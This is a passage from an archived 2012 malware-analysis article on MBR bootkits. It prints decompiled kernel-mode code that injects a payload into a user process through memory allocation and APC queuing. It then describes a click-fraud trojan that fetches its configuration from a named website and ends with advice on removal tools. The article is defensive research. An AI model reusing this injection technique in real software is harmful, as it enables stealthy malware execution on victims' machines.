    if (ObOpenObjectByPointer(Process, 512, 0, 0, PsProcessType, 0, &amp;Handle) &lt; 0)
        return 0;
    
    if (byte_13709 == 4)
    {
        // reads user- operating mode code from disk
        if (sub_11ACE(FileHandle, dword_136CC, &amp;byte_1370A, (int)&amp;Payload, (int)&amp;AllocationSize) != 2)
        {
            ZwClose(Handle);
            return 0;
        }
    }
    else
    {
        AllocationSize = 1700;
        Payload = &amp;unk_13000;
    }

    v7 = 0x24Eu;
    // allocates virtual memory in process’ address space
    if (ZwAllocateVirtualMemory(Handle, &amp;BaseAddress, 0, &amp;AllocationSize, 4096u, 64u) &lt; 0 ||
        ZwAllocateVirtualMemory(Handle, &amp;BaseAddress, 0, (PULONG)&amp;v7, 0x1000u, 04u) &lt; 0)
    {
         ZwClose(Handle);
         result = 0;
    }
    else
    {
        ZwClose(Handle);

        // connects to address space of target process
        KeStackAttachProcess(Process, &amp;ApcState);
        if (ZwCreateEvent(&amp;EventHandle, 0x1F0003u, 0, SynchronizationEvent, 0) &gt;= 0)
        {
            dword_13704 = (int)EventHandle;
            dword_1380E = 0;
            dword_1392A = 0;
            dword_1392E = 0;

            memcpy(BaseAddress, Payload, AllocationSize);
            memcpy(BaseAddress, &amp;unk_13700, 0x24Cu);
            *((_WORD *)BaseAddress + 294) = *((_WORD *)&amp;unk_13700 + 294);

            // initializes APC for current thread of target process
            KeInitializeApc(&amp;Apc, Thread, 2, sub_11498, 0, BaseAddress, 1, 0);
            
            // launches APC and executes injected code
            if ((unsigned __int8)KeInsertQueueApc(&amp;Apc, 0, 0, 0))
            {
                // Sets KTHREAD::ApcState.UserApcPending to TRUE
                *(_BYTE *)(KTHREAD_ApcState + Thread + 0x16) = 1;
                Timeout.HighPart = -1;
                Timeout.LowPart = -300000000;

                // waits for APC completion
                ZwWaitForSingleObject(EventHandle, 0, &amp;Timeout);
            }

            // disconnects from address space of target process
            KeUnstackDetachProcess(&amp;ApcState);
        }

        if (EventHandle)
            ZwClose(EventHandle);

        result = 1;
    }

    return result;
}</pre>
<p>The user mode code launches the trojan process with the payload. The corresponding module is stored in the <code>C:System Volume InformationMicrosoftservices.exe</code> file, which is created by installer at the bootkit’s installation.</p>
<p>Троянский процесс, в свою очередь, является «кликером»: после запроса конфигурации с сайта <code>www.weathertalkz.com</code>
 он осуществляет множественные переходы по рекламным баннерам в 
контексте процесса браузера Internet Explorer, работающего со скрытым 
окном.</p>
<p>In turn, the Trojan process works like a “clicker”: it requests configuration information from the <a href="https://web.archive.org/web/20180310110809/http://www.weathertalkz.com/">www.weathertalkz.com</a> website and then performs multiple jumps to Ad banners in the Internet Explorer process within a hidden window.</p>
<div class="figure"><img src="Bootkits%20%E2%80%93%20a%20new%20stage%20of%20development_files/http_requests_black_internet.jpg" alt="Fig. 14. Requests for configuration information from www.weathertalkz.com." width="640" height="139">
<p>Fig. 14. Requests for configuration information from www.weathertalkz.com.</p>
</div>
<h2 id="s8">Conclusion</h2>
<p>The increased development of malicious bootkits seems to point to the
 fact that malware developers are coming to the end of the road when it 
comes to traditional methods of malicious code startup. The MBR 
infecting technique is still rarely detected and disinfected by 
antivirus software, and is thus extremely attractive to malware 
developers.</p>
<p>The good news is that the current bootkits that can be found 
in-the-wild are quite limited when it comes to their self-protection 
capabilities. It means that a typical malicious bootkit can still be 
removed by simply restoring the original MBR. This can be achieved by 
using the standard Microsoft tool ‘fixmbr’ or, alternatively, ‘Bootkit 
Remover’, which can also detect changed or hidden MBR code , and dump 
it.</p>
<h2 id="s9">About the author</h2>
<p>Dmitry Oleksyuk is a system architect with eSage Lab. He specializes 
in kernel mode development and advanced anti-malware techniques. Dmitry 
is the main developer of TDSS Remover, Bootkit Remover and IOCTL Fuzzer 
tools.</p>
<p class="author" style="padding-left: 0px;">Last updated: 17.03.2012</p>
</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20180310110809/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20180310110809/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/about">/about</a> <a href="https://web.archive.org/web/20180310110809/http://nobunkum.ru:81/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20180310110809/https://ssl' : 'https://web.archive.org/web/20180310110809/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 11:08:09 Mar 10, 2018 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:17:04 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 0.543
  exclusion.robots: 0.156
  exclusion.robots.policy: 0.146
  esindex: 0.009
  cdx.remote: 7.019
  LoadShardBlock: 108.643 (3)
  PetaboxLoader3.datanode: 111.252 (4)
  PetaboxLoader3.resolve: 170.639 (2)
  load_resource: 177.193
-->